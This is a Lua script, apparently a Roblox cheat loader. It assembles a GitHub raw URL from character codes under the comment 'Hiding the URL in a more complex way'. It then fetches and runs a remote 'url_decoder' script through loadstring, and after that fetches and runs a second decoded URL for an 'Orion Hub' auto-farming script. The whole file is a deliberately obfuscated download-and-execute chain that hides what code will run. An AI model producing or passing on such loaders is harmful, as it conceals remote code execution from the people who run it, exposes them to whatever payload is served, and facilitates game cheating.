-- Hiding the URL in a more complex way
local urlPart1 = string.char(104, 116, 116, 112)  -- "http"
local urlPart2 = string.char(115, 58, 47, 47)  -- "s://"
local urlPart3 = string.char(114, 97, 119)  -- "raw"
local urlPart4 = string.char(103, 105, 116, 104)  -- "gith"
local urlPart5 = string.char(117, 98, 46, 99, 111, 109)  -- "ub.com"
local urlPart6 = string.char(47)  -- "/"
local urlPart7 = string.char(77, 101, 108, 104, 97, 114, 112, 101, 114)  -- "Melharper"
local urlPart8 = string.char(47)  -- "/"
local urlPart9 = string.char(71, 97, 98, 101, 66, 111, 97, 50)  -- "GabeBoa2"
local urlPart10 = string.char(47)  -- "/"
local urlPart11 = string.char(114, 101, 102, 115)  -- "refs"
local urlPart12 = string.char(47)  -- "/"
local urlPart13 = string.char(104, 101, 97, 100, 115)  -- "heads"
local urlPart14 = string.char(47)  -- "/"
local urlPart15 = string.char(109, 97, 105, 110)  -- "main"
local urlPart16 = string.char(47)  -- "/"
local urlPart17 = string.char(117, 114, 108, 95, 100, 101, 99, 111, 100, 101, 114)  -- "url_decoder"
local urlPart18 = string.char(46, 108, 117, 97)  -- ".lua"

-- Combine all parts into the full URL
local fullUrl = urlPart1 .. urlPart2 .. urlPart3 .. urlPart4 .. urlPart5 .. urlPart6 ..
                urlPart7 .. urlPart8 .. urlPart9 .. urlPart10 .. urlPart11 .. urlPart12 ..
                urlPart13 .. urlPart14 .. urlPart15 .. urlPart16 .. urlPart17 .. urlPart18

-- Fetch the URL decoder script
local urlDecoderScript = game:HttpGet(fullUrl)
local urlDecoder = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

-- Check if the decoded URL is valid and not empty
if decodedUrl and decodedUrl ~= "" then
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    local success, errorMessage = pcall(function()
        loadstring(game:HttpGet(decodedUrl))()
    end)
    if not success then
        warn("Error loading script:", errorMessage) -- Error loading the script
    end
else
    warn("Decoded URL is invalid or empty!")
end
